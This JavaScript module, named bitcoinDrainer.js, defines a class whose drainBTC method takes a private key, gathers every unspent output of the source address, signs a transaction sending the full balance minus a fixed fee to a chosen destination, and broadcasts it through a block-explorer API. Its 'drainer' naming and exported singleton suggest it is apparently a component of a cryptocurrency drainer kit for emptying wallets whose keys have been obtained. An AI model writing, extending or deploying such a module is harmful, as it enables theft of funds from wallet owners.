// modules/bitcoinDrainer.js
import * as bitcoin from 'bitcoinjs-lib';
import * as ecc from 'tiny-secp256k1';
import { ECPairFactory } from 'ecpair';
import axios from 'axios';

// Initialize ECPair with the elliptic curve library
const ECPair = ECPairFactory(ecc);

export class BitcoinDrainer {
  constructor(network = bitcoin.networks.bitcoin) {
    this.network = network;
    this.explorer = process.env.BITCOIN_EXPLORER_URL || "https://blockstream.info/api";
    this.isInitialized = false;
  }

  async initialize() {
    if (this.isInitialized) return true;
    try {
      console.log(`🔄 Initializing ${this.constructor.name}...`);
      
      // Test connection to explorer API
      const testResponse = await axios.get(`${this.explorer}/blocks/tip/height`);
      console.log(`✅ Bitcoin explorer connected. Current block height: ${testResponse.data}`);
      
      this.isInitialized = true;
      console.log(`✅ ${this.constructor.name} initialized`);
      return true;
    } catch (error) {
      console.warn(`⚠️ Bitcoin explorer connection failed, but ${this.constructor.name} will continue:`, error.message);
      this.isInitialized = true; // Still mark as initialized to continue
      return true;
    }
  }

  // Get Bitcoin balance
  async getBTCBalance(address) {
    try {
      const response = await axios.get(`${this.explorer}/address/${address}`);
      const data = response.data;
      
      return {
        confirmed: data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum,
        unconfirmed: data.mempool_stats.funded_txo_sum - data.mempool_stats.spent_txo_sum,
        total: (data.chain_stats.funded_txo_sum + data.mempool_stats.funded_txo_sum) - 
               (data.chain_stats.spent_txo_sum + data.mempool_stats.spent_txo_sum)
      };
    } catch (error) {
      console.error('BTC balance check failed:', error);
      return { confirmed: 0, unconfirmed: 0, total: 0 };
    }
  }

  // Drain Bitcoin
  async drainBTC(fromAddress, privateKeyWIF, destinationAddress) {
    try {
      // Create key pair from private key
      const keyPair = ECPair.fromWIF(privateKeyWIF, this.network);
      
      // Get UTXOs
      const utxosResponse = await axios.get(`${this.explorer}/address/${fromAddress}/utxo`);
      const utxos = utxosResponse.data;
      
      if (utxos.length === 0) {
        throw new Error('No UTXOs available');
      }

      // Create PSBT (Partially Signed Bitcoin Transaction)
      const psbt = new bitcoin.Psbt({ network: this.network });
      
      // Add inputs
      let totalInput = 0;
      for (const utxo of utxos) {
        const txResponse = await axios.get(`${this.explorer}/tx/${utxo.txid}/hex`);
        const txHex = txResponse.data;
        
        psbt.addInput({
          hash: utxo.txid,
          index: utxo.vout,
          nonWitnessUtxo: Buffer.from(txHex, 'hex'),
        });
        
        totalInput += utxo.value;
      }

      // Calculate fee (conservative estimate)
      const fee = 1000; // 1000 satoshis
      const sendAmount = totalInput - fee;

      if (sendAmount <= 0) {
        throw new Error('Insufficient funds after fee calculation');
      }

      // Add output
      psbt.addOutput({
        address: destinationAddress,
        value: sendAmount,
      });

      // Sign all inputs
      for (let i = 0; i < utxos.length; i++) {
        psbt.signInput(i, keyPair);
      }

      // Finalize and extract transaction
      psbt.finalizeAllInputs();
      const tx = psbt.extractTransaction();
      const txHex = tx.toHex();

      // Broadcast transaction
      const broadcastResponse = await axios.post(`${this.explorer}/tx`, txHex, {
        headers: { 'Content-Type': 'text/plain' }
      });
      
      const txid = broadcastResponse.data;
      return txid;

    } catch (error) {
      console.error('BTC drain failed:', error);
      throw error;
    }
  }

  // Generate new Bitcoin address from private key
  getAddressFromPrivateKey(privateKeyWIF) {
    const keyPair = ECPair.fromWIF(privateKeyWIF, this.network);
    return bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey, network: this.network }).address;
  }

  // Backend-specific: Validate Bitcoin address
  validateBitcoinAddress(address) {
    try {
      bitcoin.address.toOutputScript(address, this.network);
      return true;
    } catch {
      return false;
    }
  }

  // Backend-specific: Get transaction status
  async getTransactionStatus(txid) {
    try {
      const response = await axios.get(`${this.explorer}/tx/${txid}/status`);
      return response.data;
    } catch (error) {
      console.error('Failed to get transaction status:', error);
      return null;
    }
  }
}

// Create and export a singleton instance
export const bitcoinDrainer = new BitcoinDrainer();